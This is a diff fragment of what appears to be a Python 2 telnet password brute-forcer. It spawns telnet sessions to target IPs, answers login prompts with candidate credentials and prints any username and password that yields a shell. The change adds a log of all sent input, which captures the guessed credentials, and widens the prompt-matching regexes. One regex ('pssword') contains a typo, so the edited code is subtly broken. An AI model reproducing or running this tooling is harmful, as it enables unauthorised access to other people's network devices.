@@ -28,15 +28,21 @@ class conn_state:
     @staticmethod
     def _run(conn):
         try:
+            log_file = open('telnet.log', 'a')
             conn.child = pexpect.spawn("telnet %s" % conn.ip)
+            conn.child.logfile_send = log_file
             index = conn.child.expect(["(?i)username:", "(?i)enter:", "(?i)login:", "(?i)reject:", pexpect.TIMEOUT, pexpect.EOF], timeout = 30)
             if index < 4:
                 #print "Got flag %s" % conn.ip
                 conn.new_state(user_state)
             else:
                 conn.new_state(None)
+                if log_file:
+                    log_file.close()
         except:
             conn.new_state(None)
+            if log_file:
+                log_file.close()
 
 class user_state:
     @staticmethod
@@ -66,7 +72,7 @@ class passwd_state:
             conn.new_state(None)
             return
         conn.child.sendline(passwd)
-        index = conn.child.expect([r"[>$~/]","sername:","nter:","ccount:","ogin:","ssword:",pexpect.TIMEOUT,pexpect.EOF],timeout=30)
+        index = conn.child.expect([r"[#|->$~/]","(?i)username:","(?i)enter:","(?i)account:","(?i)login:","(?i)pssword:",pexpect.TIMEOUT,pexpect.EOF],timeout=30)
         if index == 0:
             print "Got password %s:%s-%s" % (conn.ip,conn.auth[0],conn.auth[1])
             conn.new_state(confirm_state)
